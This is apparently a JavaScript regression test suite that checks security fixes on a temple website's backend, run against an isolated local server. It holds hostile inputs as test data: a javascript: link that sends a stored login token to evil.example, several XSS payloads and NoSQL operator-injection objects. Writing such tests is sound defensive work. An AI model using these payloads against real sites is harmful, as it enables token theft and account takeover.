// Regression suite for the security fixes, run against the ISOLATED backend (throwaway db).
const BASE = process.env.SEC_BASE || 'http://127.0.0.1:5700';
const results = [];
const check = (id, ok, msg) => { results.push({ id, ok }); console.log((ok ? 'PASS ' : 'FAIL ') + id + ' - ' + msg); };

async function req(method, url, { token, body, headers = {}, raw } = {}) {
  const h = { ...headers };
  if (url === '/api/auth/signup' && !h['X-Forwarded-For']) h['X-Forwarded-For'] = '10.9.' + Math.floor(Math.random()*250) + '.' + Math.floor(Math.random()*250);
  if (body !== undefined) h['Content-Type'] = h['Content-Type'] || 'application/json';
  if (token) h.Authorization = 'Bearer ' + token;
  try {
    const r = await fetch(BASE + url, { method, headers: h, body: body === undefined ? undefined : (raw ? body : JSON.stringify(body)), redirect: 'manual', signal: AbortSignal.timeout(30000) });
    const text = await r.text(); let json; try { json = JSON.parse(text); } catch {}
    return { status: r.status, json, text, headers: r.headers };
  } catch (e) { return { status: 'ERR', text: e.message, headers: new Headers() }; }
}
const login = async (email, password, xff) => req('POST', '/api/auth/login', { body: { email, password }, headers: xff ? { 'X-Forwarded-For': xff } : {} });

(async () => {
  const SUPER = { email: 'super@test.local', password: 'SuperTest#12345' };

  // ---- headers & info leaks
  let r = await req('GET', '/api/health');
  const need = ['x-content-type-options', 'strict-transport-security', 'x-frame-options', 'content-security-policy', 'referrer-policy', 'cross-origin-opener-policy', 'permissions-policy'];
  check('H1 security headers present', need.every((h) => r.headers.get(h)), 'missing: ' + need.filter((h) => !r.headers.get(h)).join(',') || 'none');
  check('H2 x-powered-by hidden', !r.headers.get('x-powered-by'), String(r.headers.get('x-powered-by')));
  check('H3 health is minimal', r.json && Object.keys(r.json).join() === 'status', JSON.stringify(r.json));
  r = await req('GET', '/api/nope/../secret');
  check('H4 404 does not echo the path or list routes', r.json && !/secret|availableEndpoints/.test(r.text), r.text.slice(0, 80));
  r = await req('GET', '/', {});
  check('H5 root does not reveal environment', !/environment|production|development/i.test(r.text), r.text.slice(0, 80));

  // ---- CORS
  r = await req('OPTIONS', '/api/auth/login', { headers: { Origin: 'https://evil.example', 'Access-Control-Request-Method': 'POST' } });
  check('C1 evil origin refused with 403 and no ACAO', r.status === 403 && !r.headers.get('access-control-allow-origin'), `status ${r.status} ACAO=${r.headers.get('access-control-allow-origin')}`);
  r = await req('GET', '/api/health', { headers: { Origin: 'https://temple.example.test' } });
  check('C2 configured FRONTEND_URL origin allowed', r.headers.get('access-control-allow-origin') === 'https://temple.example.test', String(r.headers.get('access-control-allow-origin')));
  r = await req('GET', '/api/health', { headers: { Origin: 'https://ramchandratemple.org.np' } });
  check('C3 temple domain allowed', r.headers.get('access-control-allow-origin') === 'https://ramchandratemple.org.np', String(r.headers.get('access-control-allow-origin')));
  for (const o of ['http://localhost:3000', 'http://localhost:5000', 'https://your-frontend-url.onrender.com', 'https://rammandirlast.onrender.com']) {
    r = await req('GET', '/api/health', { headers: { Origin: o } });
    check('C4 not trusted in production: ' + o, !r.headers.get('access-control-allow-origin'), String(r.headers.get('access-control-allow-origin')));
  }

  // ---- injection keys are stripped
  r = await req('POST', '/api/auth/login', { body: { email: { $ne: null }, password: { $ne: null } } });
  check('I1 operator keys stripped (login treats it as missing fields)', r.status === 400, `status ${r.status} ${r.text.slice(0, 80)}`);

  // ---- password policy
  const mk = (n) => ({ name: 'Pol ' + n, email: `pol${n}@test.local` });
  const weak = ['123456', 'password', '12345678', 'qwerty123', 'aaaaaaaa', 'abcdefgh', 'Pass12'];
  for (const [i, pw] of weak.entries()) {
    r = await req('POST', '/api/auth/signup', { body: { ...mk('w' + i), password: pw, confirmPassword: pw } });
    check(`P1 signup refuses "${pw}"`, r.status === 400, `status ${r.status} ${r.json && r.json.message}`);
  }
  r = await req('POST', '/api/auth/signup', { body: { name: 'Email Name', email: 'jonathan@test.local', password: 'jonathan2026', confirmPassword: 'jonathan2026' } });
  check('P2 signup refuses password containing the e-mail name', r.status === 400, `status ${r.status} ${r.json && r.json.message}`);
  r = await req('POST', '/api/auth/signup', { body: { ...mk('ok'), password: 'Temple#Bell2026', confirmPassword: 'Temple#Bell2026' } });
  check('P3 signup accepts a good password', r.status === 201 && r.json && r.json.token, `status ${r.status}`);
  r = await req('POST', '/api/auth/signup', { body: { ...mk('okcase'), email: 'MixedCase@Test.Local', password: 'Temple#Bell2026', confirmPassword: 'Temple#Bell2026' } });
  const dup = await req('POST', '/api/auth/signup', { body: { name: 'Dup', email: 'mixedcase@test.local', password: 'Temple#Bell2026', confirmPassword: 'Temple#Bell2026' } });
  check('P4 e-mail is case-insensitive (no duplicate by letter case)', r.status === 201 && dup.status === 400, `first ${r.status}, lower-case duplicate ${dup.status}`);
  r = await req('POST', '/api/auth/signup', { body: { name: { $gt: '' }, email: 'obj@test.local', password: 'Temple#Bell2026' } });
  check('P5 signup refuses non-string fields', r.status === 400, `status ${r.status}`);

  // ---- enumeration
  const known = await req('POST', '/api/auth/forgot-password', { body: { email: 'pol-ok@test.local' } });
  const unknown = await req('POST', '/api/auth/forgot-password', { body: { email: 'nobody-here@test.local' } });
  check('E1 forgot-password answers identically for unknown e-mail', known.status === unknown.status && known.json.message === unknown.json.message, `known ${known.status} "${known.json && known.json.message}" / unknown ${unknown.status} "${unknown.json && unknown.json.message}"`);
  const k2 = await req('POST', '/api/auth/send-otp', { body: { email: 'pol-ok@test.local' } });
  const u2 = await req('POST', '/api/auth/send-otp', { body: { email: 'nobody-here@test.local' } });
  // known user: email is not configured in the test run so the controller answers 500 "failed to send"; unknown must NOT be distinguishable as 404
  check('E2 send-otp does not answer 404 for unknown e-mail', u2.status !== 404 && u2.status === 200, `unknown ${u2.status} ${u2.json && u2.json.message} | known ${k2.status}`);

  // ---- super admin: no more password reset from .env
  let s = await login(SUPER.email, SUPER.password);
  check('A1 super admin logs in with the seeded password', s.status === 200 && s.json && s.json.token && s.json.user.role === 'superadmin', `status ${s.status}`);
  const sToken = s.json && s.json.token;
  const NEWPW = 'Sup3r-Better-Pass!41';
  r = await req('PUT', '/api/users/password', { token: sToken, body: { currentPassword: SUPER.password, newPassword: NEWPW } });
  check('A2 super admin can change the password in the app', r.status === 200 && r.json && r.json.token, `status ${r.status} ${r.text.slice(0, 80)}`);
  const sToken2 = r.json && r.json.token; // the old token ended with the change; this one is the fresh session
  r = await login(SUPER.email, SUPER.password);
  check('A3 the old (.env) password no longer works', r.status === 401, `status ${r.status}`);
  r = await login(SUPER.email, NEWPW);
  check('A4 the new password works and is NOT overwritten by .env', r.status === 200, `status ${r.status}`);
  r = await req('PUT', '/api/users/password', { token: sToken2, body: { currentPassword: NEWPW, newPassword: '12345678' } });
  check('A5 changing to a common password is refused', r.status === 400, `status ${r.status} ${r.json && r.json.message}`);
  const superToken = r.status === 400 ? (await login(SUPER.email, NEWPW)).json.token : sToken;

  // ---- unsafe links are refused, real links still save
  const getSettings = await req('GET', '/api/admin/settings');
  const base = getSettings.json || {};
  const put = (patch) => req('PUT', '/api/admin/settings', { token: superToken, body: patch });
  r = await put({ footer: { ...(base.footer || {}), mapUrl: 'javascript:fetch("//evil.example/?t="+localStorage.token)' } });
  check('U1 javascript: map URL refused', r.status === 400, `status ${r.status} ${r.json && r.json.message}`);
  r = await put({ footer: { ...(base.footer || {}), mapUrl: 'JaVaScRiPt:alert(1)' } });
  check('U2 mixed-case javascript: refused', r.status === 400, `status ${r.status}`);
  r = await put({ footer: { ...(base.footer || {}), mapUrl: 'java\tscript:alert(1)' } });
  check('U3 tab-obfuscated javascript: refused', r.status === 400, `status ${r.status}`);
  r = await put({ footer: { ...(base.footer || {}), navButtons: [{ label: { en: 'x' }, path: ' \n javascript:alert(1)' }] } });
  check('U4 javascript: nav path refused (leading whitespace)', r.status === 400, `status ${r.status}`);
  r = await put({ liveVideo: { url: 'data:text/html,<script>alert(1)</script>' } });
  check('U5 data:text/html refused', r.status === 400, `status ${r.status}`);
  r = await put({ footer: { ...(base.footer || {}), mapUrl: 'https://www.google.com/maps/embed?pb=!1m18', navButtons: [{ label: { en: 'Events' }, path: '/events' }] }, socialLinks: base.socialLinks });
  check('U6 normal https map URL and /path nav still save', r.status === 200, `status ${r.status} ${(r.text || '').slice(0, 100)}`);
  r = await req('POST', '/api/admin/profile/photo', { token: superToken, body: { note: 'x' } });
  r = await req('PUT', '/api/admin/social', { token: superToken, body: { socialLinks: [{ platform: 'facebook', url: 'javascript:alert(1)' }] } });
  check('U7 javascript: social link refused', r.status === 400, `status ${r.status}`);
  r = await req('POST', '/api/contact/', { body: { name: 'A', email: 'a@b.co', subject: 'hi', message: 'javascript:alert(1)' } });
  check('U8 public form with a javascript: value is refused', r.status === 400, `status ${r.status}`);

  // ---- rate limits behind a proxy: buckets follow X-Forwarded-For (trust proxy = 1)
  let codes = [];
  for (let i = 0; i < 65; i += 1) codes.push((await login('nobody' + i + '@test.local', 'wrong-pass-123', '203.0.113.7')).status);
  check('R1 65 logins from one forwarded address get rate limited', codes.includes(429), codes.join(','));
  r = await login('someone@test.local', 'wrong-pass-123', '203.0.113.99');
  check('R2 a different forwarded address is NOT blocked by the first one', r.status === 401, `status ${r.status}`);
  codes = [];
  for (let i = 0; i < 17; i += 1) codes.push((await login('pol-ok@test.local', 'bad-guess-' + i, '198.51.100.' + (10 + i))).status);
  check('R3 guessing ONE account from many addresses is capped (per-account limit)', codes.includes(429), codes.join(','));
  codes = [];
  for (let i = 0; i < 22; i += 1) codes.push((await req('POST', '/api/auth/signup', { body: { name: 'Bulk', email: `bulk${i}@test.local`, password: 'Temple#Bell2026' }, headers: { 'X-Forwarded-For': '192.0.2.50' } })).status);
  check('R4 mass sign-up from one address is capped', codes.includes(429), codes.join(','));
  codes = [];
  for (let i = 0; i < 7; i += 1) codes.push((await req('POST', '/api/auth/send-otp', { body: { email: 'target@test.local' }, headers: { 'X-Forwarded-For': '192.0.2.' + (60 + i) } })).status);
  check('R5 reset codes for ONE account from many addresses are capped', codes.includes(429), codes.join(','));

  console.log('\nFAILED:', results.filter((x) => !x.ok).length, 'of', results.length);
  require('fs').writeFileSync(__dirname + '/verify-results.json', JSON.stringify(results, null, 1));
})().catch((e) => { console.error(e); process.exit(1); });
